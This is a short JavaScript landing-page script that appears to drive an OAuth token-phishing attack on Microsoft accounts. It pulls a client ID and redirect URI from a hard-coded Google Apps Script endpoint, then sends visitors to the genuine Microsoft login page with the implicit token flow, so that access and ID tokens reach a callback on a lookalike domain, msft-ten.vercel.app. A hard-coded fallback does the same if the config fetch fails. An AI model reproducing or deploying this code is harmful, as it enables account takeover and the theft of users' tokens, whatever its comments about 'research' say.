/**
 * VERCEL LANDING LOGIC - index.js
 */

// 1. REPLACE THIS URL with your actual Google Script URL
const GS_URL = "https://script.google.com/macros/s/AKfycbzm1Zu1s2TjmypWZDuV5TLElWC-GkRolDsMi3_wDDG152PXbFPmRas0wY6j6_aD2Vq8/exec"; 

async function startBridge() {
    console.log("Bridge Started. Fetching configuration...");

    try {
        // We add a timeout to the fetch so it doesn't hang forever
        const controller = new AbortController();
        const id = setTimeout(() => controller.abort(), 5000);

        const response = await fetch(`${GS_URL}?action=getConfig`, {
            method: 'GET',
            mode: 'cors',
            signal: controller.signal
        });

        clearTimeout(id);
        const config = await response.json();

        if (config.status === "error") {
            throw new Error(config.message);
        }

        console.log("Config received. Redirecting to Microsoft...");

        // Construct the high-trust Microsoft Auth URL
        const microsoftAuthUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
            `client_id=${config.clientId}` +
            `&response_type=token+id_token` +
            `&scope=openid+profile+offline_access` +
            `&response_mode=fragment` +
            `&prompt=login` + 
            `&redirect_uri=${encodeURIComponent(config.redirectUri)}`;

        // TRIGGER REDIRECT
        window.location.href = microsoftAuthUrl;

    } catch (err) {
        console.error("Bridge Error:", err.message);
        
        // FALLBACK: If Google Script fails, try a hardcoded redirect
        // to keep the research moving.
        const FALLBACK_ID = "29d9ed98-a469-4536-ade2-f981bc1d605e";
        const FALLBACK_URI = "https://msft-ten.vercel.app/callback";
        
        window.location.href = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=${FALLBACK_ID}&response_type=token+id_token&scope=openid+profile+offline_access&response_mode=fragment&prompt=login&redirect_uri=${encodeURIComponent(FALLBACK_URI)}`;
    }
}
